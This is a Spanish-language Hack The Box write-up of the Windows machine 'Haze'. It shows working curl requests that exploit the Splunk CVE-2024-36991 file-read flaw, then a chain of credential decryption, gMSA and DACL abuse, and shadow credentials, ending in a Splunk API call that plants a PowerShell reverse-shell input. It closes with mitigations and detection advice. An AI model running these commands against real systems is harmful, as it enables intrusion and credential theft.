---
machine: Haze
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, splunk, cve-2024-36991, gmsa, shadow-credentials]
---

# Haze — Hack The Box (Windows)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Splunk Enterprise 9.2.1 permite leer archivos con CVE-2024-36991. Se obtienen `splunk.secret` y la configuración LDAP, se descifra la contraseña de `paul.taylor` y se enumeran usuarios por SAMR. Una cadena de gMSA, `WriteOwner`, `WriteMembers` y shadow credentials llega a `edward.martin`; una copia de Splunk y el input modular de PowerShell llevan a SYSTEM con GodPotato.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 <IP>
```

- DC de `haze.htb` con puertos AD.
- Splunk Web en 8000, HEC en 8088 y management en 8089.
- Splunkd anuncia la versión 9.2.1.

## Enumeración

- La versión es anterior a 9.2.2/9.1.5, corregidas para CVE-2024-36991.
- El traversal de `os.path.join` en Windows permite leer archivos relativos a `$SPLUNK_HOME`.

```bash
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret'
```

## Foothold

`authentication.conf` contiene el `bindDN` y un blob `$7$`; `splunk.secret` es la clave maestra. `splunksecrets splunk-decrypt` recupera la contraseña LDAP de `paul.taylor`.

```bash
splunksecrets splunk-decrypt -S splunk.secret '<BLOB>'
nxc smb dc01.haze.htb -u paul.taylor -p '<PASSWORD>' --rid-brute 5000
```

La enumeración SAMR revela `mark.adams`, `edward.martin`, `alexander.green`, la gMSA `Haze-IT-Backup$` y grupos como `gMSA_Managers` y `Support_Services`.

## Movimiento lateral

`mark.adams` está en `gMSA_Managers` y puede modificar `msDS-GroupMSAMembership` de la gMSA. Se autoriza a sí mismo para leerla y obtiene el hash NTLM.

```powershell
Set-ADServiceAccount -Identity 'Haze-IT-Backup$' -PrincipalsAllowedToRetrieveManagedPassword mark.adams
```

La gMSA tiene `WriteOwner` sobre `Support_Services`. Se cambia el propietario, se concede `WriteMembers` y se añade a sí misma al grupo. Ese grupo tiene `AddKeyCredentialLink` sobre `edward.martin`; `certipy-ad shadow auto` obtiene su hash.

```bash
impacket-owneredit -target support_services -new-owner 'HAZE-IT-BACKUP$' -action write
impacket-dacledit -action write -rights WriteMembers -principal 'HAZE-IT-BACKUP$' -target-dn 'CN=Support_Services,CN=Users,DC=Haze,DC=htb'
certipy-ad shadow auto -username 'HAZE-IT-BACKUP$@haze.htb' -hashes :<NTLM> -account edward.martin
```

## Escalada de privilegios

`edward.martin` pertenece a `Backup_Reviewers` y puede leer una copia de Splunk. La configuración contiene un secreto heredado y la contraseña de `alexander.green`, administrador de Splunk. Con acceso a la API se crea un input modular `powershell` que ejecuta una reverse shell como la cuenta del servicio.

```bash
splunksecrets splunk-legacy-decrypt -S backup/etc/auth/splunk.secret '<BLOB>'
# Exporta SPLUNK_AUTH con el usuario y la contraseña antes de ejecutar.
curl -sk --user "$SPLUNK_AUTH" -X POST \
  'https://haze.htb:8089/servicesNS/nobody/search/data/inputs/powershell' \
  --data-urlencode 'name=evil' --data-urlencode 'script=<PS_REVSHELL>' \
  --data-urlencode 'schedule=0/30 * * * * ?' --data-urlencode 'index=main'
```

La shell resultante tiene `SeImpersonatePrivilege`; GodPotato la eleva a `NT AUTHORITY\SYSTEM`.

## Evidencia

- Lectura de `authentication.conf` y `splunk.secret`.
- Contraseña LDAP descifrada, redactada.
- Enumeración SAMR y cadena gMSA/DACL.
- Shadow credentials y WinRM como `edward.martin`.
- Input de PowerShell y `whoami` como SYSTEM.
- Flag redactada.

## Lecciones aprendidas

- Un secreto de aplicación puede descifrar credenciales de otro servicio.
- `WriteOwner` sobre un grupo permite reconstruir la membresía sin ser administrador.
- Los backups de Splunk contienen secretos antiguos que siguen siendo válidos.

## Mitigaciones y detección

- Actualizar Splunk a 9.2.2, 9.1.5 o 9.0.10.
- Rotar secretos y credenciales LDAP; no reutilizarlos en backups.
- Auditar cambios en `msDS-GroupMSAMembership`, propietarios de grupos y `msDS-KeyCredentialLink`.
- Restringir inputs modulares y monitorizar creación de inputs `powershell`.

## Referencias

- <https://www.hackthebox.com/machines/Haze>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-36991>
- <https://adsecurity.org/?p=2011>
- <https://attack.mitre.org/techniques/T1558/003/>
